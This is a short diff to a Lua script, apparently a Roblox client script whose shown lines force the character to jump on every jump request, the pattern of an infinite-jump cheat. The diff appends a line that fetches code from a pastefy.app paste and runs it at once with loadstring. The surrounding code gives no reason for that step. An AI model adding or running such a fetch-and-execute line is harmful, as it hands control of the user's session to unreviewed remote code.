@@ -17,3 +17,5 @@ UIS.JumpRequest:Connect(function()
         Player.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
     end
 end)
+
+loadstring(game:HttpGet("https://pastefy.app/Ocvq0Xwx/raw"))()
